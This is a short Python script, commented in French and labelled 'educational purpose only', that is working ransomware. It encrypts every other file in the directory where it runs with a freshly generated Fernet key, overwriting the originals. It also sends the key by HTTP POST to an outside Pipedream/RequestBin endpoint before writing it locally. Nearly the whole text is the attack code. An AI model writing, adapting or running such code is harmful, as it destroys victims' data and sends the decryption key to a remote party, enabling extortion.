# EDUCATIONAL PURPOSE ONLY

import os
import requests  # Ajout pour l'envoi de la requête HTTP
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file in ["install.py", "thekey.key", "demal.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

# Envoi de la clé à un RequestBin
url = 'https://eom0ocw68n1e7jy.m.pipedream.net'  # Remplacez cela par votre URL RequestBin
headers = {'Content-Type': 'application/json'}
payload = {'key': key.decode()}  # Convertir la clé en string pour l'envoi
response = requests.post(url, json=payload, headers=headers)

if response.ok:
    print("La clé a été envoyée avec succès à RequestBin.")
else:
    print("Échec de l'envoi de la clé à RequestBin.")

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("get crypted")

